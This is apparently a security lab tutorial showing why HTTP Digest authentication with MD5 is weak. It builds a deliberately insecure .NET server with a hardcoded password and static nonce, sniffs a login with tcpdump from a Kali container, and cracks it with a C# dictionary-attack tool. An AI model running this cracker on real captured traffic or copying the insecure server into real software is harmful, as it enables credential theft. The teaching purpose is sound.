# Cracking the Vault: Hacking Digest Authentication with .NET

**Basic Authentication** was easy to break because it sent passwords in cleartext (Base64). **Digest Authentication** (RFC 2617) was the industry's attempt to fix this by using **Challenge-Response** cryptography. The password never crosses the wire; only a "hash" does.

So, it's secure, right? **Wrong**.

In this lab, we will demonstrate why Digest Authentication failed the test of time. You will intercept a login handshake and use an **Offline Dictionary** Attack to reverse the hash and recover the admin password using a custom C# tool.
***
### The Architecture

We will use the **Sidecar Pattern** inside a **Podman Pod**. This allows our "Attacker" container (Kali) to share the same network interface as our "Target" container (.NET), effectively simulating a compromised network.

- **Target**: A .NET Web API manually implementing Digest Auth (Port 8081).
- **Attacker**: A Kali Linux container running tcpdump.
- **The Vulnerability**: The server uses **MD5**, a hashing algorithm that is now considered cryptographically broken and too fast, making it susceptible to brute-force attacks.

### Phase 1: Build the Target(.NET)

We need a web server that challenges us. We will write a "Vault" application that manually computes MD5 hashes to validate users.

#### 1. The Application Code (Program.cs)
Create `DigestAuth` folder.
Create `src` folder within `DigestAuth`. Save this code into a file named `Program.cs` in src. It mocks a banking vault that protects its assets with Digest Auth.

```csharp
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

var builder = WebApplication.CreateBuilder(args);
var app = builder.Build();

app.MapGet("/vault", (HttpContext context) =>
{
    string authHeader = context.Request.Headers["Authorization"];
    
    // Static "Nonce" (Number used once) for this educational lab
    string realm = "BankVault";
    string nonce = "dcd98b7102dd2f0e8b11d0f600bfb0c093"; 
    string opaque = "5ccc069c403ebaf9f0171e9517f40e41";

    // 1. Trigger the Challenge if no header is present
    if (string.IsNullOrEmpty(authHeader) || !authHeader.StartsWith("Digest "))
    {
        context.Response.Headers["WWW-Authenticate"] = 
            $"Digest realm=\"{realm}\", qop=\"auth\", nonce=\"{nonce}\", opaque=\"{opaque}\"";
        return Results.Unauthorized();
    }

    try
    {
        // 2. Extract the Client's Proof
        var username = Regex.Match(authHeader, "username=\"([^\"]+)\"").Groups[1].Value;
        var uri = Regex.Match(authHeader, "uri=\"([^\"]+)\"").Groups[1].Value;
        var response = Regex.Match(authHeader, "response=\"([^\"]+)\"").Groups[1].Value;
        var nc = Regex.Match(authHeader, "nc=([^,]+)").Groups[1].Value;
        var cnonce = Regex.Match(authHeader, "cnonce=\"([^\"]+)\"").Groups[1].Value;

        // 3. The Secret Password (We are trying to crack this!)
        var password = "monkey123"; 

        // 4. Verify the Hash (RFC 2617 Logic)
        // HA1 = MD5(username:realm:password)
        var ha1 = CalculateMd5($"{username}:{realm}:{password}");
        
        // HA2 = MD5(method:uri)
        var ha2 = CalculateMd5($"{context.Request.Method}:{uri}");

        // Response = MD5(HA1:nonce:nc:cnonce:qop:HA2)
        var expectedResponse = CalculateMd5($"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}");

        if (response == expectedResponse)
        {
            return Results.Ok(new { flag = "flag{md5_is_fast_but_weak}", status = "Unlocked" });
        }
    }
    catch { return Results.BadRequest(); }

    return Results.Unauthorized();
});

// Helper function for MD5
string CalculateMd5(string input)
{
    using var md5 = MD5.Create();
    var bytes = md5.ComputeHash(Encoding.ASCII.GetBytes(input));
    return Convert.ToHexString(bytes).ToLower();
}

app.Run("http://0.0.0.0:8081");

```

#### 2. The Containerfile
Save this as `Containerfile` in `DigestAuth` folder.

```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build
WORKDIR /src
# Create project scaffolding
RUN dotnet new web -n AuthDigest
COPY src/Program.cs /src/AuthDigest/Program.cs
WORKDIR /src/AuthDigest
RUN dotnet publish -c Release -o /app

FROM mcr.microsoft.com/dotnet/aspnet:8.0
WORKDIR /app
COPY --from=build /app .
ENTRYPOINT ["dotnet", "AuthDigest.dll"]

```

### Phase 2: Deploy the Lab

We will use Podman to spin up the shared environment. Run these commands in your terminal from `DigestAuth` folder.

```bash
# 1. Build the Target Image
podman build -f Containerfile -t auth-digest-target .

# 2. Create the Pod (We expose 8081 this time)
# If you already have 'auth-range', you can reuse it or create a new one.
podman pod create --name auth-digest-pod -p 8081:8081

# 3. Launch the Target
podman run -d --pod auth-digest-pod --name target-digest auth-digest-target

# 4. Launch the Sidecar Attacker (Kali)
podman run -d --pod auth-digest-pod --name attacker-digest kalilinux/kali-rolling sleep infinity

```

### Phase 3: The Attack
Now, you play the role of the hacker. You have compromised the network and are listening for traffic.

#### Step 1: Start the Sniffer
Remote into your kali sidecar and start listening on Port 8081.

```bash
podman exec -it attacker-digest /bin/bash

# Inside the container:
apt update && apt install -y tcpdump
tcpdump -i any -A port 8081

```
#### Step 2: Trigger the Handshake
Open your host browser and navigate to `http://localhost:8081/vault`. 
Log in with the valid credentials:
- **User** admin
- **Password** monkey123

#### Step 3: Capture the Hash
Look at your Kali terminal. You will see a complex header like this:

```http
Authorization: Digest username="admin", realm="BankVault", nonce="dcd9...", uri="/vault", response="7e2d3f...", cnonce="MTIz...", nc=00000001...
```

You need to extract these **5 critical values** from the text:
1. **Nonce:** The server's challenge.
2. **CNonce:** The client's random string.
3. **NC:** The nonce count.
4. **Response:** The final hash (This is your target).
5. **Realm:** "BankVault".

#### Step 4: The "Crack" Code(C#)

We cannot "decode" the response like Base64. We have to **guess** the password, hash it, and see if it matches.

Create a new C# Console App (dotnet new console -n Cracker) and use this code:

```csharp
using System.Security.Cryptography;
using System.Text;

class Program
{
    static void Main()
    {
        // --- 1. FILL THIS DATA FROM TCPDUMP ---
        string USER = "admin";
        string REALM = "BankVault";
        string URI = "/vault";
        string METHOD = "GET";
        string NONCE = "dcd98b7102dd2f0e8b11d0f600bfb0c093"; 
        
        // These specific values come from YOUR captured traffic
        string CNONCE = "CHANGE_ME_TO_CAPTURED_CNONCE"; 
        string NC = "00000001"; 
        string TARGET_HASH = "CHANGE_ME_TO_CAPTURED_RESPONSE"; 

        // --- 2. THE ATTACK ---
        string[] wordlist = { "password", "123456", "admin", "monkey123", "letmein" };

        Console.WriteLine("[*] Starting Dictionary Attack...");

        foreach (var password in wordlist)
        {
            // Replicate the browser's logic
            string ha1 = MD5Hash($"{USER}:{REALM}:{password}");
            string ha2 = MD5Hash($"{METHOD}:{URI}");
            
            // RFC 2617 Calculation
            string calc = MD5Hash($"{ha1}:{NONCE}:{NC}:{CNONCE}:auth:{ha2}");

            if (calc == TARGET_HASH)
            {
                Console.WriteLine($"[+] CRACKED: Password is '{password}'");
                return;
            }
        }
        Console.WriteLine("[-] Password not in dictionary.");
    }

    static string MD5Hash(string input)
    {
        using var md5 = MD5.Create();
        return Convert.ToHexString(md5.ComputeHash(Encoding.ASCII.GetBytes(input))).ToLower();
    }
}

```
#### Step: 5 Run the Exploit
Paste your captured values into the strings and run the app.
```bash
dotnet run
# Output: [+] CRACKED: Password is 'monkey123'
```

### Conclusion

You have successfully performed an **Offline Dictionary Attack**.

**Why did this happen?**

Digest Authentication relies on `MD5`, which is computationally cheap. A modern GPU can calculate billions of MD5 hashes per second. By capturing a single handshake, an attacker can take the data home and run it against massive wordlists (like RockYou.txt) until they find the password.

**The Fix:**

Stop using Digest. Move to **Session-based Authentication** (Cookies) over HTTPS, or modern tokens like **OAuth 2.0** and **OIDC**, which we will cover in the upcoming exercises.

#### TODO

Instructions for Running the `Cracker.cs` inside Kali linux.